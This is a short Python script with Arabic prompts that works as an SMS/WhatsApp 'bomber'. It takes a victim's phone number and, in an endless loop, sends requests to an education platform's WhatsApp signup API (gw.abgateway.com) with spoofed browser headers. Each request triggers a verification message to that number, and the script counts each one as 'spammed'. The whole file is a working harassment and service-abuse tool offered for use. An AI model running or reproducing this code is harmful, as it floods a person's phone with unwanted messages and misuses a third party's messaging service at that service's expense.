import requests
import time

g = "\033[1;32m"
r = "\033[1;31m"
e = "\033[0m"

def SMARK():
    s = input("ادخل رقم الموبايل -المطور العامري @R3_1J")
    u = "https://gw.abgateway.com/student/whatsapp/signup"
    h = {
        "Host": "gw.abgateway.com",
        "sec-ch-ua-platform": '"Linux"',
        "sec-ch-ua": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        "sec-ch-ua-mobile": "?0",
        "x-trace-id": "guest_user:5743fd73-9490-4b19-90f5-bb3391ddbd51",
        "access-control-allow-origin": "*",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Platform": "web",
        "Origin": "https://www.abwaabiraq.com",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.abwaabiraq.com/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "ar,en-US;q=0.9,en;q=0.8,ja;q=0.7",
        "Priority": "u=1"
    }
    d = {
        "language": "ar",
        "password": "Ab9rT6xQ",
        "country": "",
        "phone": s,
        "platform": "web",
        "data": {"Language": "ar"},
        "channel": "whatsapp"
    }
    n = 0
    while True:
        try:
            rqs = requests.post(u, headers=h, json=d)
            n += 1
            try:
                j = rqs.json()
                print(f"{g}تم اسبام رقم: {n} | Response JSON: {j}{e}")
            except:
                print(f"{g}تم اسبام رقم: {n} | Response Text: {rqs.text}{e}")
            time.sleep(1)
        except Exception as err:
            print(f"{r}Error: {err}{e}")
            time.sleep(1)

SMARK()